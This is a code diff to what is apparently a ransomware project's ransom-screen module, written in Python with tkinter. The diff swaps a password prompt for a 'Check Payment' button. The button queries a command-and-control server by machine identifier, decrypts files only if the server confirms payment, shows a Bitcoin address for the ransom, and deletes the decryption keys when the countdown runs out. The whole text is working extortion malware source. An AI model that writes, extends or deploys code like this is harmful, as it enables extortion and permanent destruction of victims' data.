@@ -4,9 +4,11 @@ import json
 import time
 import tkinter as tk
 import multiprocessing
+import requests
 from datetime import datetime, timedelta
 from Decrypt import decrypt_all_files
-from Variables import script_files, seconds_left, password, timer_file_name
+from RSA_Key_Handling import get_machine_identifier
+from Variables import script_files, seconds_left, password, timer_file_name, c2_server
 
 ####################################################################################################################
 
@@ -62,31 +64,38 @@ def timer_window():
         expiration_time = start_time + timedelta(seconds=seconds_left)
         save_timer_data(start_time, expiration_time)
 
-    attempts = 0
-
-    def check_password():
-        nonlocal attempts
-        entered_password = password_entry.get()
-
-        if entered_password == password:
-            result_label.config(text="Password correct. Decrypting...")
-            decrypt_all_files()
-            delete_keys()
-            stop_flag.set()
-            root.quit()
-            sys.exit()
-        else:
-            attempts += 1
-            if attempts >= 3:
-                result_label.config(text="TOLD YOU NOT TO TRY AND GUESS")
-                root.update()
-                time.sleep(5)
-                delete_keys()
-                stop_flag.set()
-                root.quit()
-                sys.exit()
+    def check_payment_status():
+        unique_id = get_machine_identifier()
+        try:
+            response = requests.get(c2_server + f"/payment_status/{unique_id}_private.pem")
+            if response.status_code == 200:
+                data = response.json()
+                paid = data.get('paid', False)
+                if paid:
+                    result_label.config(text="Payment received", fg="green")
+                    decrypt_all_files()
+                    delete_keys()
+                    time.sleep(10)
+                    stop_flag.set()
+                    root.quit()
+                    sys.exit()
+                else:
+                    result_label.config(text="Payment not received.", fg="red")
             else:
-                result_label.config(text="Incorrect password, DO NOT TRY AND GUESS IT!!!")
+                result_label.config(text="Error checking payment.", fg="yellow")
+        except Exception as e:
+            result_label.config(text=f"Request failed: {e}", fg="yellow")
+
+    def load_btc_address():
+        try:
+            with open("response_data.json", "r") as json_file:
+                data = json.load(json_file)
+            
+                btc_address = data.get("btc_address", "BTC Address not found")
+
+                return btc_address
+        except Exception as e:
+            return f"Error loading BTC Address: {e}"
 
     def update_timer():
         remaining_time = int((expiration_time - datetime.now()).total_seconds())
@@ -95,7 +104,10 @@ def timer_window():
             root.after(1000, update_timer)
         else:
             delete_keys()
+            time.sleep(10)
+            stop_flag.set()
             root.quit()
+            sys.exit()
 
     root = tk.Tk()
 
@@ -119,10 +131,12 @@ def timer_window():
     timer_label = tk.Label(root, font=("Helvetica", 50), fg="white", bg="black")
     timer_label.pack(pady=50)
 
-    password_entry = tk.Entry(root, show="*", font=("Helvetica", 24), width=20)
-    password_entry.pack(pady=10)
+    address_label = tk.Label(root, text="", font=("Helvetica", 24), fg="yellow", bg="black")
+    address_label.pack(pady=20)
+    btc_address = load_btc_address()
+    address_label.config(text=f"BTC Address: {btc_address}")
 
-    submit_button = tk.Button(root, text="Submit Password", command=check_password, font=("Helvetica", 24), bg="red", fg="white", width=20)
+    submit_button = tk.Button(root, text="Check Payment", command=check_payment_status, font=("Helvetica", 24), bg="red", fg="white", width=20)
     submit_button.pack(pady=20)
 
     result_label = tk.Label(root, text="", font=("Helvetica", 24), fg="yellow", bg="black")
